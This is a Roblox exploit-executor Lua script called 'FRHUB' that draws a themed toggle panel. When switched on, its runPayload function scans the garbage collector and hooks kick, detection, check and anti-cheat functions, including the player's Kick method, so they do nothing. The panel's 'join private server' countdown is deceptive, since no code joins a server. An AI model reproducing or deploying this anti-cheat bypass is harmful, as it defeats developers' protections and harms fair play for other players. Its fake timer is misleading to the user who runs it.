-- IF YOU LEAKED THIS SOURCE Congrats! W SKID😎

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local lp = Players.LocalPlayer

local old = CoreGui:FindFirstChild("FRHUB_UI")
if old then old:Destroy() end

local sg = Instance.new("ScreenGui")
sg.Name = "FRHUB_UI"
sg.ResetOnSpawn = false
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.Parent = CoreGui

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 240, 0, 300)
main.Position = UDim2.new(0.5, -120, 0.5, -150)
main.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
main.BackgroundTransparency = 0.15
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = sg

local bgImg = Instance.new("ImageLabel")
bgImg.Size = UDim2.new(1, 0, 1, 0)
bgImg.BackgroundTransparency = 1
bgImg.Image = "rbxassetid://86057063967853"
bgImg.ScaleType = Enum.ScaleType.Crop
bgImg.ImageTransparency = 0.4
bgImg.ZIndex = 0
bgImg.Parent = main

local bgC = Instance.new("UICorner")
bgC.CornerRadius = UDim.new(0, 14)
bgC.Parent = bgImg

local grad = Instance.new("UIGradient")
grad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 100, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 160, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 80, 240))
})
grad.Rotation = 0
grad.Parent = main

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(200, 130, 255)
stroke.Thickness = 2
stroke.Transparency = 0.3
stroke.Parent = main

local strokeGrad = Instance.new("UIGradient")
strokeGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 170, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 100, 255))
})
strokeGrad.Rotation = 0
strokeGrad.Parent = stroke

local mc = Instance.new("UICorner")
mc.CornerRadius = UDim.new(0, 14)
mc.Parent = main

local title1 = Instance.new("TextLabel")
title1.Size = UDim2.new(1, 0, 0, 22)
title1.Position = UDim2.new(0, 0, 0, 12)
title1.BackgroundTransparency = 1
title1.Text = "FRHUB"
title1.TextColor3 = Color3.fromRGB(255, 255, 255)
title1.TextSize = 20
title1.Font = Enum.Font.GothamBlack
title1.TextStrokeTransparency = 0.8
title1.TextStrokeColor3 = Color3.fromRGB(100, 0, 150)
title1.Parent = main

local line = Instance.new("TextLabel")
line.Size = UDim2.new(0, 180, 0, 14)
line.Position = UDim2.new(0.5, -90, 0, 34)
line.BackgroundTransparency = 1
line.Text = "[××××××××××××××]"
line.TextColor3 = Color3.fromRGB(255, 220, 255)
line.TextSize = 12
line.Font = Enum.Font.GothamBold
line.TextStrokeTransparency = 0.85
line.TextStrokeColor3 = Color3.fromRGB(80, 0, 120)
line.Parent = main

local title2 = Instance.new("TextLabel")
title2.Size = UDim2.new(1, 0, 0, 16)
title2.Position = UDim2.new(0, 0, 0, 50)
title2.BackgroundTransparency = 1
title2.Text = "PRIVATE SERVER SCRIPT"
title2.TextColor3 = Color3.fromRGB(255, 240, 255)
title2.TextSize = 11
title2.Font = Enum.Font.GothamBold
title2.TextStrokeTransparency = 0.85
title2.TextStrokeColor3 = Color3.fromRGB(80, 0, 120)
title2.Parent = main

local t1g = Instance.new("UIGradient")
t1g.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 150, 255))
})
t1g.Rotation = 0
t1g.Parent = title1

local t2g = Instance.new("UIGradient")
t2g.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(250, 220, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 130, 255))
})
t2g.Rotation = 0
t2g.Parent = title2

local btn = Instance.new("TextButton")
btn.Name = "Toggle"
btn.Size = UDim2.new(0, 150, 0, 38)
btn.Position = UDim2.new(0.5, -75, 0, 85)
btn.BackgroundColor3 = Color3.fromRGB(180, 30, 30)
btn.Text = "OFF"
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextSize = 14
btn.Font = Enum.Font.GothamBold
btn.BorderSizePixel = 0
btn.TextStrokeTransparency = 0.9
btn.TextStrokeColor3 = Color3.fromRGB(50, 0, 0)
btn.Parent = main

local bc = Instance.new("UICorner")
bc.CornerRadius = UDim.new(0, 10)
bc.Parent = btn

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, 0, 0, 18)
timerLabel.Position = UDim2.new(0, 0, 0, 135)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "YOU WILL JOIN PRIVATE SERVER IN 01:09"
timerLabel.TextColor3 = Color3.fromRGB(255, 240, 255)
timerLabel.TextSize = 11
timerLabel.Font = Enum.Font.GothamBold
timerLabel.Visible = false
timerLabel.TextStrokeTransparency = 0.85
timerLabel.TextStrokeColor3 = Color3.fromRGB(60, 0, 100)
timerLabel.Parent = main

local note1 = Instance.new("TextLabel")
note1.Size = UDim2.new(1, -20, 0, 16)
note1.Position = UDim2.new(0, 10, 0, 165)
note1.BackgroundTransparency = 1
note1.Text = "انت لازم تكون في سيرفر صاحبك الخاص"
note1.TextColor3 = Color3.fromRGB(255, 235, 255)
note1.TextSize = 10
note1.Font = Enum.Font.GothamBold
note1.TextWrapped = true
note1.TextStrokeTransparency = 0.85
note1.TextStrokeColor3 = Color3.fromRGB(60, 0, 100)
note1.Parent = main

local note2 = Instance.new("TextLabel")
note2.Size = UDim2.new(1, -20, 0, 16)
note2.Position = UDim2.new(0, 10, 0, 183)
note2.BackgroundTransparency = 1
note2.Text = "you should be in your friend private server"
note2.TextColor3 = Color3.fromRGB(255, 235, 255)
note2.TextSize = 10
note2.Font = Enum.Font.GothamBold
note2.TextWrapped = true
note2.TextStrokeTransparency = 0.85
note2.TextStrokeColor3 = Color3.fromRGB(60, 0, 100)
note2.Parent = main

local keyHint = Instance.new("TextLabel")
keyHint.Size = UDim2.new(1, 0, 0, 14)
keyHint.Position = UDim2.new(0, 0, 0, 210)
keyHint.BackgroundTransparency = 1
keyHint.Text = "[F] Toggle  |  [H] Hide/Show"
keyHint.TextColor3 = Color3.fromRGB(230, 200, 255)
keyHint.TextSize = 9
keyHint.Font = Enum.Font.GothamBold
keyHint.TextStrokeTransparency = 0.85
keyHint.TextStrokeColor3 = Color3.fromRGB(60, 0, 100)
keyHint.Parent = main

spawn(function()
    while main and main.Parent do
        for i = 0, 360, 2 do
            if not main or not main.Parent then break end
            grad.Rotation = i
            strokeGrad.Rotation = i + 90
            t1g.Rotation = i
            t2g.Rotation = i + 180
            wait(0.03)
        end
    end
end)

local isOn = false
local isLocked = false
local timerRunning = false
local timeLeft = 69

local function runPayload()
    local plrs = game:GetService("Players")
    local lp = plrs.LocalPlayer

    local function isSafe()
        for i = 2, 10 do
            local ok, info = pcall(function() return debug.getinfo(i) end)
            if not ok or not info then break end
            local src = info.source or ""

            if src:lower():find("medusa") or src:lower():find("packages") or src:lower():find("net") then
                return true
            end

            if src:find("%.") then
                return false
            end
        end
        return true
    end

    for _, v in pairs(getgc()) do
        if typeof(v) == "function" then
            local info = debug.getinfo(v)
            if info and info.name then
                local name = info.name:lower()
                if name:find("kick") or name:find("bxor") or name:find("detect") or name:find("check") or name:find("anti") then
                    if info.what == "C" and (name == "band" or name == "bxor" or name == "bor" or name == "bnot") then
                        local cloned = clonefunction(v)
                        hookfunction(v, function(...)
                            if isSafe() then return cloned(...) end
                            return nil
                        end)
                    else
                        hookfunction(v, function(...)
                            return nil
                        end)
                    end
                end
            end
        end
    end

    hookfunction(lp.Kick, function(...)
        return nil
    end)

    lp.CharacterAdded:Connect(function()
        wait(0.5)
        pcall(function()
            hookfunction(lp.Kick, function(...) return nil end)
        end)
    end)
    print("working")
end

local function formatTime(s)
    local m = math.floor(s / 60)
    local sec = s % 60
    return string.format("%02d:%02d", m, sec)
end

local function startTimer()
    timerRunning = true
    timerLabel.Visible = true
    timeLeft = 69

    spawn(function()
        while timerRunning and timeLeft > 0 do
            timeLeft = timeLeft - 1
            timerLabel.Text = "YOU WILL JOIN PRIVATE SERVER IN " .. formatTime(timeLeft)
            wait(1)
        end
        if timeLeft <= 0 then
            timerLabel.Text = "YOU WILL JOIN PRIVATE SERVER IN 00:00"
        end
    end)
end

local function toggleOn()
    if isLocked then return end
    isOn = true
    isLocked = true

    btn.Text = "ON 🔒"
    btn.BackgroundColor3 = Color3.fromRGB(0, 120, 40)

    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 50)}):Play()

    runPayload()
    startTimer()
end

btn.MouseButton1Click:Connect(toggleOn)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end

    if input.KeyCode == Enum.KeyCode.F then
        if not isOn then
            toggleOn()
        end
    elseif input.KeyCode == Enum.KeyCode.H then
        main.Visible = not main.Visible
    end
end)

btn.TouchTap:Connect(toggleOn)
